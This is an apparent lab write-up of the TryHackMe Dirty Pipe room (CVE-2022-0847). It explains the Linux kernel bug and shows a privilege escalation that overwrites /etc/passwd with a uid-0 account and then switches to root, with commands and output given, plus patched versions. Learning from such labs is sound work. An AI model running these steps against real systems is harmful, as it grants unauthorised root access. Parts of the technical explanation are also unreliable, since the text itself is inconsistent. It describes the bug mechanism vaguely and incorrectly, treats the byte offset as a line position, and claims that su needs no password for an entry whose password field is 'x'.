# Dirty Pipe (CVE-2022-0847)

| | |
|---|---|
| **Platform** | TryHackMe |
| **Difficulty** | Medium |
| **URL** | https://tryhackme.com/room/dirtypipe |
| **Focus** | Kernel memory validation bug allowing arbitrary file overwrite; immediate privilege escalation to root |

---

## Vulnerability Summary

**Dirty Pipe (CVE-2022-0847)** is a critical kernel-level vulnerability in Linux that allows unprivileged users to overwrite read-only files — including SUID binaries and system files like `/etc/passwd` — without authentication or elevated privileges.

### The Core Bug

The Linux kernel uses pipes — memory-based communication channels between processes. When data is written to a pipe, it is copied to special memory pages. **The bug:** the kernel does not validate whether a memory page actually belongs to a pipe before writing to it.

An attacker can:
1. Open a readable file (e.g., `/etc/passwd`) in memory
2. Create a pipe that, by design, maps to the same memory location
3. Write to the pipe → the kernel overwrites the file without detecting it

**Result:** immediate privilege escalation to root because:
- No prior privileges required (a normal user executes it)
- No password required (read access is sufficient)
- Works on any readable file

---

## Exploitation

### Initial Access

```bash
ssh tryhackme@<TARGET_IP>
whoami
# tryhackme

id
# uid=1000(tryhackme) gid=1000(tryhackme) groups=1000(tryhackme)
```

Unprivileged user access provided by the lab. Verify kernel version to confirm vulnerability window (5.8 through pre-patch versions).

### Compiling the Exploit

```bash
gcc -o exploit exploit.c
```

PoC is from Saleem Rashid's original disclosure.

### Overwriting `/etc/passwd`

```bash
./exploit /etc/passwd 1 "alex:x:0:0:root:/root:/bin/bash"
```

**Parameters:**
- **offset (1):** Position in the file (second `/etc/passwd` entry = user `tryhackme`)
- **Payload:** New user entry with uid=0 (root)

**How offset works:** The exploit:
1. Opens `/etc/passwd` in read mode → maps file into memory
2. Creates a pipe pointing to the same memory location
3. Calculates byte-position of the target line
4. Writes payload to pipe → kernel overwrites the file

### Verification

```bash
cat /etc/passwd | grep alex
# alex:x:0:0:root:/root:/bin/bash

su alex
# Password: [press Enter — no password needed]

id
# uid=0(root) gid=0(root) groups=0(root)
```

Root shell obtained. Any user entry with uid=0 is treated as root by Linux, regardless of the username.

---

## Technical Details

**Memory validation failure:** The kernel should verify:
- Does this page belong to this pipe?
- Does it have the correct flags?

Instead, the kernel trusts that memory is safe and allows writes to any page the attacker can read.

**SUID exploitation:** Binaries with the SUID bit set (`-rws--s--x`) execute as their owner (root) automatically. Dirty Pipe can overwrite these binaries or their dependencies, achieving RCE.

**Why `/etc/passwd` is vulnerable:**
- Readable by all users (`-rw-r--r--`)
- Controls system authentication (uid=0 = root)
- Kernel does not validate "ownership of a line" — only that uid/gid are valid
- Any entry with uid=0 becomes root

---

## Affected Versions

- Linux kernel 5.8 through specific later versions
- Patched in: 5.10.102+, 5.15.25+, 5.16.11+

---

## Remediation

Update kernel to patched version or apply CVE-2022-0847 patch directly.

---

## Key Insight

A bug in memory validation can compromise the entire OS. Even "read-only" files are vulnerable if the kernel doesn't validate page ownership. Privilege escalation does not always live in userspace — kernel-level bugs grant immediate total compromise.
